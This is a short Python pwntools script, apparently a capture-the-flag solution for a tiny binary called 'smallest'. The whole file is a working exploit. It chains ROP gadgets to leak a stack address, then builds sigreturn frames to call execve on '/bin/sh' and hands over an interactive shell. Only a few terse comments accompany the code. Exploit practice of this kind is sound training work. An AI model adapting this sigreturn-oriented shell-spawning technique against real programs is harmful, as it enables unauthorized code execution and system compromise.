# Astri_2017
from pwn import *
import time
r = process('./smallest')
time.sleep(0.1)

read = 0x00000000004000b0
next = 0x00000000004000b3
syscall = 0x00000000004000be
ret = 0x00000000004000c0

def packAll(rop):
    return flat([p64(x) for x in rop])

s = SigreturnFrame(arch='amd64')

rop = [read, next, read]

# leak stack base
r.send(packAll(rop)+'\x04')
time.sleep(0.1)
r.send('\xb3')
time.sleep(0.1)
stack_base = u64(r.recv(1000)[16:24])
log.info('stack base: 0x%x'%stack_base)
r.recv()

s.rsp = stack_base
s.rax = 0
s.rdi = 0
s.rsi = stack_base - 0x10
#s.rsi = stack_base
s.rip = syscall
s.rdx = 0x200

rop = [read, syscall]
r.send(packAll(rop)+str(s))
time.sleep(0.1)
inp = p64(syscall)+str(s)[0:7]
r.send(inp)
time.sleep(0.1)

s.rax = 59
s.rdi = stack_base-0x10
s.rsi = stack_base-0x8
s.rdx = 0
s.rip = syscall

rop = [read, syscall]
r.send('/bin/sh\x00'+'\x00'*0x8+packAll(rop)+str(s))

inp = p64(syscall)+str(s)[0:7]
r.send(inp)

r.interactive()

